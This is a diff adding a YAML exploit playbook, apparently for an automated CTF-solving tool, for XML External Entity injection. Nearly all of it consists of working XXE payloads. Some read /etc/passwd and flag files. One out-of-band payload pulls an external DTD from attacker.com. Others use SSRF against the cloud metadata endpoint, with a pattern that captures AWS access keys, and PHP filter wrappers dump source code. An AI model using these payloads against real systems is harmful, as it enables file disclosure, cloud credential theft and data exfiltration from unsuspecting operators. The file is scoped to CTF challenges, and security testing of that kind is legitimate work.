@@ -1,0 +1,175 @@
+# ============================================================
+# Tree metadata
+# ============================================================
+id: web_xxe
+name: XML External Entity Injection
+category: web
+version: "1.0"
+author: system
+description: >
+  Detects and exploits XXE vulnerabilities in XML parsers. Targets applications
+  that parse XML input without disabling external entity processing, enabling
+  file disclosure, SSRF, and out-of-band data exfiltration.
+
+# ============================================================
+# Guard
+# ============================================================
+applies_when:
+  - "context.challenge.type == 'web'"
+
+min_confidence: 0.10
+
+stop_on_flag: true
+
+# ============================================================
+# Confidence seeds
+# ============================================================
+confidence_seeds:
+  - if: "'xml' in context.tech_stack or 'soap' in context.tech_stack"
+    boost: 0.35
+    label: "XML technology detected"
+  - if: "any(p in context.params for p in ['xml','data','upload','file','content'])"
+    boost: 0.20
+    label: "Data input parameter found"
+  - if: "any(p in context.found_paths for p in ['/upload', '/import', '/parse', '/api', '/soap'])"
+    boost: 0.15
+    label: "XML processing endpoint found"
+  - if: "'java' in context.tech_stack or 'php' in context.tech_stack or '.net' in context.tech_stack"
+    boost: 0.15
+    label: "XML-prone language detected"
+
+# ============================================================
+# Detection paths
+# ============================================================
+detection_paths:
+
+  - id: basic_xxe_probe
+    name: Basic XXE detection
+    description: >
+      Inject simple XXE payload to test for external entity processing.
+    min_confidence: 0.10
+    steps:
+      - id: simple_xxe_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'
+            - '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'
+        signals:
+          - match: 'root:.*:/bin/|localhost'
+            on_match:
+              confidence_boost: 0.50
+              emit: xxe_file_read_confirmed
+
+  - id: xxe_error_based
+    name: Error-based XXE detection
+    description: >
+      Trigger XML parsing errors to confirm XXE processing.
+    min_confidence: 0.15
+    steps:
+      - id: error_xxe_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>'
+        signals:
+          - match: 'No such file|cannot be resolved|entity|DTD|DOCTYPE'
+            on_match:
+              confidence_boost: 0.35
+              emit: xxe_error_confirmed
+
+  - id: xxe_oob_probe
+    name: Out-of-band XXE detection
+    description: >
+      Test for blind XXE via external DTD callback (requires OOB listener).
+    min_confidence: 0.20
+    steps:
+      - id: oob_xxe_test
+        action: http_probe
+        params:
+          inject_into: all_params
+          payloads:
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>test</foo>'
+        signals:
+          - match: 'callback|received|dns'
+            on_match:
+              confidence_boost: 0.40
+              emit: xxe_oob_confirmed
+
+# ============================================================
+# Exploitation paths
+# ============================================================
+exploitation_paths:
+
+  - id: xxe_flag_read
+    name: Direct flag file read
+    requires_signal: xxe_file_read_confirmed
+    technique: xxe_direct_file_disclosure
+    steps:
+      - id: read_flag_xxe
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><foo>&xxe;</foo>'
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><foo>&xxe;</foo>'
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/flag.txt">]><foo>&xxe;</foo>'
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/flag.txt">]><foo>&xxe;</foo>'
+        capture:
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+          - pattern: 'CTF\{[^}]+\}'
+            as: flag_value
+
+  - id: xxe_passwd_read
+    name: Read /etc/passwd
+    requires_signal: xxe_file_read_confirmed
+    technique: xxe_system_file_read
+    steps:
+      - id: read_passwd
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+        capture:
+          - pattern: 'root:.*?:.*?:'
+            as: passwd_content
+
+  - id: xxe_ssrf_metadata
+    name: XXE to SSRF cloud metadata
+    requires_signal: xxe_file_read_confirmed
+    technique: xxe_ssrf_chain
+    steps:
+      - id: metadata_via_xxe
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><foo>&xxe;</foo>'
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'
+        capture:
+          - pattern: 'AKIA[0-9A-Z]{16}'
+            as: aws_key
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
+
+  - id: xxe_php_wrapper
+    name: PHP wrapper exploitation
+    requires_signal: xxe_error_confirmed
+    technique: xxe_php_filter
+    steps:
+      - id: php_filter_xxe
+        action: http_probe
+        params:
+          inject_into: vulnerable_param
+          payloads:
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">]><foo>&xxe;</foo>'
+            - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>'
+        capture:
+          - pattern: '[A-Za-z0-9+/=]{20,}'
+            as: base64_content
+          - pattern: 'flag\{[^}]+\}'
+            as: flag_value
